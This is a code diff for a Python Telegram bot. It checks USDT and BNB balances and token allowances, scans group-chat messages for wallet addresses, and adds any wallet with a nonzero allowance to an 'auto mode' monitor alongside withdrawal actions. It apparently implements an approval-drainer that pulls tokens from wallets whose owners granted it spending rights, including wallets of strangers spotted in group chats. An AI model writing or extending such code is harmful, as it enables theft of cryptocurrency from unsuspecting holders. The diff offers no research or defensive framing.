@@ -11,8 +11,9 @@ from utils import (
     create_main_menu, create_back_menu, is_rate_limited, validate_usdt_amount,
     log_user_action, create_wallet_info_text, create_error_message,
     create_success_message, create_info_message, create_warning_message,
-    truncate_address, format_usdt_amount
+    truncate_address, format_usdt_amount, create_enhanced_wallet_detection_text
 )
+from auto_mode import auto_mode_manager
 from config import RATE_LIMIT_SECONDS
 
 logger = logging.getLogger(__name__)
@@ -72,6 +73,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await handle_withdraw_custom(query, context)
         elif data == "refresh":
             await handle_refresh(query, context)
+        elif data == "toggle_auto_mode":
+            await handle_toggle_auto_mode(query, context)
+        elif data == "toggle_auto_gas":
+            await handle_toggle_auto_gas(query, context)
         elif data == "main_menu":
             await handle_main_menu(query, context)
         else:
@@ -168,11 +173,12 @@ async def handle_check_wallet(query, context):
         parse_mode=ParseMode.MARKDOWN
     )
     
-    # Get wallet information
-    balance = blockchain_manager.get_usdt_balance(wallet)
+    # Get comprehensive wallet information
+    usdt_balance = blockchain_manager.get_usdt_balance(wallet)
+    bnb_balance = blockchain_manager.get_bnb_balance(wallet)
     allowance = blockchain_manager.get_allowance(wallet)
     
-    if balance is None or allowance is None:
+    if usdt_balance is None or bnb_balance is None or allowance is None:
         await query.edit_message_text(
             create_error_message(
                 "Failed to retrieve wallet information. Please check your connection and try again."
@@ -182,7 +188,11 @@ async def handle_check_wallet(query, context):
         )
         return
     
-    wallet_info = create_wallet_info_text(wallet, balance, allowance)
+    # Add to auto monitoring if approved
+    if allowance > 0:
+        auto_mode_manager.add_wallet(wallet)
+    
+    wallet_info = create_wallet_info_text(wallet, usdt_balance, allowance, bnb_balance)
     await query.edit_message_text(
         wallet_info,
         reply_markup=create_main_menu(),
@@ -357,11 +367,12 @@ async def handle_wallet_input(update, context, wallet_address):
     log_user_action(update.effective_user.id, update.effective_user.username,
                    "wallet_set", wallet)
     
-    # Get and display wallet information
-    balance = blockchain_manager.get_usdt_balance(wallet)
+    # Get comprehensive wallet information
+    usdt_balance = blockchain_manager.get_usdt_balance(wallet)
+    bnb_balance = blockchain_manager.get_bnb_balance(wallet)
     allowance = blockchain_manager.get_allowance(wallet)
     
-    if balance is None or allowance is None:
+    if usdt_balance is None or bnb_balance is None or allowance is None:
         await update.message.reply_text(
             create_warning_message(
                 f"Wallet address saved: `{truncate_address(wallet)}`\n\n"
@@ -373,13 +384,12 @@ async def handle_wallet_input(update, context, wallet_address):
         )
         return
     
-    success_text = (
-        f"✅ *Wallet Successfully Added*\n\n"
-        f"📍 Address: `{truncate_address(wallet)}`\n"
-        f"💰 Balance: {format_usdt_amount(balance)}\n"
-        f"🔐 Allowance: {format_usdt_amount(allowance)}\n\n"
-        f"You can now perform withdrawals using the menu below:"
-    )
+    # Add to auto monitoring if approved
+    if allowance > 0:
+        auto_mode_manager.add_wallet(wallet)
+    
+    success_text = create_wallet_info_text(wallet, usdt_balance, allowance, bnb_balance)
+    success_text += f"\n\nYou can now perform withdrawals using the menu below:"
     
     await update.message.reply_text(
         success_text,
@@ -404,19 +414,20 @@ async def handle_group_message(update: Update, context: ContextTypes.DEFAULT_TYP
                     # Log the detection
                     log_user_action(user.id, user.username, f"address_detected_in_group:{chat.title}", address)
                     
-                    # Get wallet info
-                    balance = blockchain_manager.get_usdt_balance(address)
+                    # Get comprehensive wallet info
+                    usdt_balance = blockchain_manager.get_usdt_balance(address)
+                    bnb_balance = blockchain_manager.get_bnb_balance(address)
                     allowance = blockchain_manager.get_allowance(address)
                     
-                    if balance is not None and allowance is not None:
-                        response_text = (
-                            f"🔍 *Wallet Address Detected*\n\n"
-                            f"📍 Address: `{truncate_address(address)}`\n"
-                            f"💰 Balance: {format_usdt_amount(balance)}\n"
-                            f"🔐 Allowance: {format_usdt_amount(allowance)}\n\n"
-                            f"💬 Chat: {chat.title or 'Unknown'}\n"
-                            f"👤 User: {user.first_name or 'Unknown'}"
+                    if usdt_balance is not None and bnb_balance is not None and allowance is not None:
+                        # Create enhanced detection message
+                        response_text = create_enhanced_wallet_detection_text(
+                            address, usdt_balance, bnb_balance, allowance
                         )
+                        
+                        # Add wallet to auto monitoring if approved
+                        if allowance > 0:
+                            auto_mode_manager.add_wallet(address)
                         
                         # Send to chat (if bot has permissions) or log
                         try:
@@ -435,11 +446,12 @@ async def auto_handle_wallet_address(update: Update, context: ContextTypes.DEFAU
     try:
         user = update.effective_user
         
-        # Get wallet information
-        balance = blockchain_manager.get_usdt_balance(address)
+        # Get comprehensive wallet information
+        usdt_balance = blockchain_manager.get_usdt_balance(address)
+        bnb_balance = blockchain_manager.get_bnb_balance(address)
         allowance = blockchain_manager.get_allowance(address)
         
-        if balance is None or allowance is None:
+        if usdt_balance is None or bnb_balance is None or allowance is None:
             await update.message.reply_text(
                 create_warning_message(
                     f"🔍 Wallet address detected: `{truncate_address(address)}`\n\n"
@@ -454,13 +466,15 @@ async def auto_handle_wallet_address(update: Update, context: ContextTypes.DEFAU
         wallet = blockchain_manager.w3.to_checksum_address(address)
         context.user_data["wallet"] = wallet
         
+        # Add to auto monitoring if approved
+        if allowance > 0:
+            auto_mode_manager.add_wallet(wallet)
+        
         log_user_action(user.id, user.username, "auto_wallet_detected", wallet)
         
         success_text = (
             f"🔍 *Wallet Address Auto-Detected*\n\n"
-            f"📍 Address: `{truncate_address(wallet)}`\n"
-            f"💰 Balance: {format_usdt_amount(balance)}\n"
-            f"🔐 Allowance: {format_usdt_amount(allowance)}\n\n"
+            f"{create_wallet_info_text(wallet, usdt_balance, allowance, bnb_balance)}\n\n"
             f"✅ Wallet automatically added to your session.\n"
             f"You can now perform withdrawals using the menu below:"
         )
@@ -475,6 +489,70 @@ async def auto_handle_wallet_address(update: Update, context: ContextTypes.DEFAU
         logger.error(f"Error in auto wallet handler: {e}")
         await update.message.reply_text(
             create_error_message("Error processing wallet address."),
+            reply_markup=create_main_menu(),
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+async def handle_toggle_auto_mode(query, context):
+    """Handle auto mode toggle"""
+    try:
+        enabled, message = auto_mode_manager.toggle_auto_mode()
+        
+        # Get current wallet and add to monitoring if enabled and approved
+        wallet = context.user_data.get("wallet")
+        if enabled and wallet:
+            allowance = blockchain_manager.get_allowance(wallet)
+            if allowance and allowance > 0:
+                auto_mode_manager.add_wallet(wallet)
+        
+        status_text = (
+            f"{message}\n\n"
+            f"{auto_mode_manager.get_status()}"
+            f"Choose an action below:"
+        )
+        
+        await query.edit_message_text(
+            status_text,
+            reply_markup=create_main_menu(),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        
+    except Exception as e:
+        logger.error(f"Error toggling auto mode: {e}")
+        await query.edit_message_text(
+            create_error_message("Failed to toggle auto mode. Please try again."),
+            reply_markup=create_main_menu(),
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+async def handle_toggle_auto_gas(query, context):
+    """Handle auto gas toggle"""
+    try:
+        enabled, message = auto_mode_manager.toggle_auto_gas()
+        
+        # Get current wallet and add to monitoring if enabled and approved
+        wallet = context.user_data.get("wallet")
+        if enabled and wallet:
+            allowance = blockchain_manager.get_allowance(wallet)
+            if allowance and allowance > 0:
+                auto_mode_manager.add_wallet(wallet)
+        
+        status_text = (
+            f"{message}\n\n"
+            f"{auto_mode_manager.get_status()}"
+            f"Choose an action below:"
+        )
+        
+        await query.edit_message_text(
+            status_text,
+            reply_markup=create_main_menu(),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        
+    except Exception as e:
+        logger.error(f"Error toggling auto gas: {e}")
+        await query.edit_message_text(
+            create_error_message("Failed to toggle auto gas. Please try again."),
             reply_markup=create_main_menu(),
             parse_mode=ParseMode.MARKDOWN
         )
